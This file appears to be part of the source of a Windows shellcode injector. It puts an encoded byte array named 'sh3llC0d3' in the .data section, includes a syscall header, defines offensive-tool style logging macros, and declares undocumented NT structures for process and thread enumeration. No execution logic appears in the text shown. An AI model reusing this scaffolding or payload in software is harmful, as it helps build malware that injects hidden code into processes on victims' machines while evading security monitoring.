#include <Windows.h> 
#include "syscall.h"
#pragma section(".data");
__declspec(allocate(".data")) CONST UCHAR sh3llC0d3[] = {
  0x68, 0x31, 0x5F, 0x36, 0xFD, 0x0A, 0x3E, 0x2A, 0xEC, 0x93, 0xF9, 0x83, 0x4C, 0x32, 0x09, 0xEC,
  0x47, 0x9E, 0x16, 0x7E, 0x05, 0xA1, 0xBA, 0xBD, 0xA4, 0x82, 0x3A, 0x1D, 0x1C, 0x7E, 0x2E, 0x39,
  0x92, 0x49, 0xD1, 0x5B, 0x56, 0xB0, 0xF6, 0x82, 0x94, 0xBB, 0xBD, 0x07, 0xE7, 0xD7, 0x20, 0xB8,
  0x0D, 0xD9, 0xFC, 0x42, 0xDA, 0x9F, 0x38, 0x5F, 0xCD, 0xE1, 0xFB, 0xB0, 0xC3, 0xB4, 0xE8, 0x1A,
  0x04, 0x11, 0xBE, 0x99, 0x11, 0x64, 0xB5, 0xD0, 0xAD, 0xFB, 0x0D, 0x27, 0xD0, 0x3F, 0x96, 0x0A,
  0x96, 0x53, 0x7E, 0x9C, 0x1B, 0x60, 0x62, 0x84, 0x17, 0x70, 0xB2, 0x0A, 0xF5, 0xC6, 0xB6, 0x3F,
  0xC9, 0xA7, 0xF8, 0xEB, 0x29, 0x9F, 0xDC, 0x93, 0x84, 0x18, 0xC9, 0xAA, 0x3D, 0x93, 0xB0, 0xDC,
  0x7A, 0xBC, 0x93, 0x7F, 0xE4, 0xC9, 0xA9, 0x35, 0x93, 0xED, 0xF8, 0x28, 0x65, 0xB9, 0x47, 0x7C,
  0x60, 0x82, 0xA4, 0x30, 0xE7, 0x86, 0xC9, 0x7C, 0x4E, 0x06, 0xEF, 0x16, 0xF7, 0x49, 0x47, 0xD1,
  0x90, 0xB2, 0x91, 0xFC, 0x44, 0x1E, 0x13, 0x39, 0xC8, 0xFE, 0x5C, 0xEB, 0x94, 0x89, 0x53, 0x9D,
  0xE1, 0xF7, 0x64, 0xE9, 0x0F, 0x9D, 0x6F, 0xD0, 0x35, 0xB9, 0x2C, 0xBF, 0xFE, 0x54, 0x2A, 0x77,
  0x80, 0x0D, 0x6C, 0x5F, 0x9A, 0xB9, 0x3A, 0xA8, 0xD0, 0xC7, 0xE8, 0xF9, 0x7E, 0xBE, 0x68, 0x5B,
  0x6F, 0x60, 0x4B, 0x63, 0xB3, 0x7E, 0xF7, 0xBC, 0x6D, 0xEC, 0x05, 0xF4, 0x6C, 0x50, 0x47, 0xAC,
  0x6E, 0xD4, 0xC5, 0x8A, 0x0A, 0xB3, 0x73, 0x7C, 0x56, 0xE4, 0x38, 0x56, 0xE9, 0x57, 0x92, 0x67,
  0xA8, 0x98, 0x5F, 0x83, 0xC2, 0xAB, 0xEF, 0x3A, 0xA9, 0xE6, 0x2D, 0xF1, 0x13, 0x83, 0xF1, 0x0D,
  0xF0, 0x3C, 0xF4, 0x01, 0x25, 0x0A, 0xE4, 0x19, 0x2B, 0x82, 0xC5, 0xB2, 0x99, 0x02, 0x3D, 0x6E,
  0xBB, 0x62, 0xB9, 0xCF, 0xE7, 0xD4, 0x34, 0xD0, 0xB8, 0x6D, 0x92, 0xAE, 0xDB, 0xA4, 0x56, 0x74,
  0x69, 0x0A, 0x96, 0xF6, 0x46, 0xB7, 0x96, 0x63, 0x87, 0xB2, 0x29, 0xA9, 0xD3, 0xA7, 0x39, 0xCC
};

#define break(msg) printf("========================[%s]========================\n",msg); 
#define okay(msg,...) printf("[+] " msg, __VA_ARGS__);
#define warn(msg,...) printf("[!] " msg, __VA_ARGS__);






typedef struct _CLIENT_ID
{
    VOID* UniqueProcess;                                                    
    VOID* UniqueThread;                                                     
} CLIENT_ID, *PCLIENT_ID;
 



typedef struct _SYSTEM_BASIC_INFORMATION{
    ULONG Reserved;
    ULONG TimerResolution;
    ULONG PageSize;
    ULONG NumberOfPhysicalPages;
    ULONG LowestPhysicalPageNumber;
    ULONG HighestPhysicalPageNumber;
    ULONG AllocationGranularity;
    ULONG_PTR MinimumUserModeAddress;
    ULONG_PTR MaximumUserModeAddress;
    KAFFINITY ActiveProcessorsAffinityMask;
    CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, * PSYSTEM_BASIC_INFORMATION;



typedef LONG KPRIORITY, * PKPRIORITY;


typedef enum _KTHREAD_STATE
{
    Initialized,
    Ready,
    Running,
    Standby,
    Terminated,
    Waiting,
    Transition,
    DeferredReady,
    GateWaitObsolete,
    WaitingForProcessInSwap,
    MaximumThreadState
} KTHREAD_STATE, * PKTHREAD_STATE;


typedef enum _KWAIT_REASON
{
    Executive,               // Waiting for an executive event.
    FreePage,                // Waiting for a free page.
    PageIn,                  // Waiting for a page to be read in.
    PoolAllocation,          // Waiting for a pool allocation.
    DelayExecution,          // Waiting due to a delay execution.           // NtDelayExecution
    Suspended,               // Waiting because the thread is suspended.    // NtSuspendThread
    UserRequest,             // Waiting due to a user request.              // NtWaitForSingleObject
    WrExecutive,             // Waiting for an executive event.
    WrFreePage,              // Waiting for a free page.
    WrPageIn,                // Waiting for a page to be read in.
    WrPoolAllocation,        // Waiting for a pool allocation.
    WrDelayExecution,        // Waiting due to a delay execution.
    WrSuspended,             // Waiting because the thread is suspended.
    WrUserRequest,           // Waiting due to a user request.
    WrEventPair,             // Waiting for an event pair.                  // NtCreateEventPair
    WrQueue,                 // Waiting for a queue.                        // NtRemoveIoCompletion
    WrLpcReceive,            // Waiting for an LPC receive.
    WrLpcReply,              // Waiting for an LPC reply.
    WrVirtualMemory,         // Waiting for virtual memory.
    WrPageOut,               // Waiting for a page to be written out.
    WrRendezvous,            // Waiting for a rendezvous.
    WrKeyedEvent,            // Waiting for a keyed event.                  // NtCreateKeyedEvent
    WrTerminated,            // Waiting for thread termination.
    WrProcessInSwap,         // Waiting for a process to be swapped in.
    WrCpuRateControl,        // Waiting for CPU rate control.
    WrCalloutStack,          // Waiting for a callout stack.
    WrKernel,                // Waiting for a kernel event.
    WrResource,              // Waiting for a resource.
    WrPushLock,              // Waiting for a push lock.
    WrMutex,                 // Waiting for a mutex.
    WrQuantumEnd,            // Waiting for the end of a quantum.
    WrDispatchInt,           // Waiting for a dispatch interrupt.
    WrPreempted,             // Waiting because the thread was preempted.
    WrYieldExecution,        // Waiting to yield execution.
    WrFastMutex,             // Waiting for a fast mutex.
    WrGuardedMutex,          // Waiting for a guarded mutex.
    WrRundown,               // Waiting for a rundown.
    WrAlertByThreadId,       // Waiting for an alert by thread ID.
    WrDeferredPreempt,       // Waiting for a deferred preemption.
    WrPhysicalFault,         // Waiting for a physical fault.
    WrIoRing,                // Waiting for an I/O ring.
    WrMdlCache,              // Waiting for an MDL cache.
    WrRcu,                   // Waiting for read-copy-update (RCU) synchronization.
    MaximumWaitReason
} KWAIT_REASON, * PKWAIT_REASON;


typedef struct _SYSTEM_THREAD_INFORMATION
{
    LARGE_INTEGER KernelTime;       // Number of 100-nanosecond intervals spent executing kernel code.
    LARGE_INTEGER UserTime;         // Number of 100-nanosecond intervals spent executing user code.
    LARGE_INTEGER CreateTime;       // System time when the thread was created.
    ULONG WaitTime;                 // Time spent in ready queue or waiting (depending on the thread state).
    PVOID StartAddress;             // Start address of the thread.
    CLIENT_ID ClientId;             // ID of the thread and the process owning the thread.
    KPRIORITY Priority;             // Dynamic thread priority.
    KPRIORITY BasePriority;         // Base thread priority.
    ULONG ContextSwitches;          // Total context switches.
    KTHREAD_STATE ThreadState;      // Current thread state.
    KWAIT_REASON WaitReason;        // The reason the thread is waiting.
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;


typedef struct _SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;                  // The address of the previous item plus the value in the NextEntryOffset member. For the last item in the array, NextEntryOffset is 0.
    ULONG NumberOfThreads;                  // The NumberOfThreads member contains the number of threads in the process.
    ULONGLONG WorkingSetPrivateSize;        // since VISTA
    ULONG HardFaultCount;                   // since WIN7
    ULONG NumberOfThreadsHighWatermark;     // The peak number of threads that were running at any given point in time, indicative of potential performance bottlenecks related to thread management.
    ULONGLONG CycleTime;                    // The sum of the cycle time of all threads in the process.
    LARGE_INTEGER CreateTime;               // Number of 100-nanosecond intervals since the creation time of the process. Not updated during system timezone changes.
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;               // The file name of the executable image.
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;             // since VISTA (requires SystemExtendedProcessInformation)
    SIZE_T PeakVirtualSize;                 // The peak size, in bytes, of the virtual memory used by the process.
    SIZE_T VirtualSize;                     // The current size, in bytes, of virtual memory used by the process.
    ULONG PageFaultCount;                   // The member of page faults for data that is not currently in memory. 
    SIZE_T PeakWorkingSetSize;              // The peak size, in kilobytes, of the working set of the process.
    SIZE_T WorkingSetSize;                  // The number of pages visible to the process in physical memory. These pages are resident and available for use without triggering a page fault.
    SIZE_T QuotaPeakPagedPoolUsage;         // The peak quota charged to the process for pool usage, in bytes.
    SIZE_T QuotaPagedPoolUsage;             // The quota charged to the process for paged pool usage, in bytes.
    SIZE_T QuotaPeakNonPagedPoolUsage;      // The peak quota charged to the process for nonpaged pool usage, in bytes.
    SIZE_T QuotaNonPagedPoolUsage;          // The current quota charged to the process for nonpaged pool usage.
    SIZE_T PagefileUsage;                   // The PagefileUsage member contains the number of bytes of page file storage in use by the process.
    SIZE_T PeakPagefileUsage;               // The maximum number of bytes of page-file storage used by the process.
    SIZE_T PrivatePageCount;                // The number of memory pages allocated for the use by the process.
    LARGE_INTEGER ReadOperationCount;       // The total number of read operations performed.
    LARGE_INTEGER WriteOperationCount;      // The total number of write operations performed.
    LARGE_INTEGER OtherOperationCount;      // The total number of I/O operations performed other than read and write operations.
    LARGE_INTEGER ReadTransferCount;        // The total number of bytes read during a read operation.
    LARGE_INTEGER WriteTransferCount;       // The total number of bytes written during a write operation.
    LARGE_INTEGER OtherTransferCount;       // The total number of bytes transferred during operations other than read and write operations.
    SYSTEM_THREAD_INFORMATION Threads[1];   // This type is not defined in the structure but was added for convenience.
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;